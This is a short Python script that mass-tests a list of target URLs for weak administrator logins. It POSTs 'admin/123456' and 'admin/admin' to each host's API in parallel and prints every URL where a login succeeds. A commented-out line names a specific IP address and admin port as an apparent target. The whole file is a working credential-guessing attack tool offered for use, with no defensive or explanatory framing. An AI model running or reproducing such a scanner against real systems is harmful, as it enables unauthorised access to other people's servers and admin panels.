import requests
import re
import sys
from multiprocessing import Process,Pool

# url = "http://162.14.125.50:8161/admin/"
def test(url):
    try:
        headers={
            "Accept":"application/json, text/plain, */*",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":url,
            "Referer":url,
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8"
        }
        data="api_action=User.Login&Username=admin&Password=123456"
        x=requests.post(url,headers=headers,data=data,timeout=0.5)
        if "CSRFToken" in x.text:
            print(url,":123456")
        # print(x.text)

        data="api_action=User.Login&Username=admin&Password=admin"
        x=requests.post(url,headers=headers,data=data,timeout=0.5)
        if "CSRFToken" in x.text:
            print(url,":admin")
        # print(x.text)

    except BaseException:
        return 0

if __name__ =='__main__':

    f = open(sys.argv[1])

    input = list()
    for i in f.readlines():
        input.append(i.replace('\n','')+"api")
        # print(i.replace('\n','')+"admin/")
    
    f.close()

    pool = Pool(processes=10)

    for url in input:
        # print(url)
        pool.apply_async(test,(url,))

    pool.close()
    pool.join()

    print('end!!!!!!!!!!!!!!!')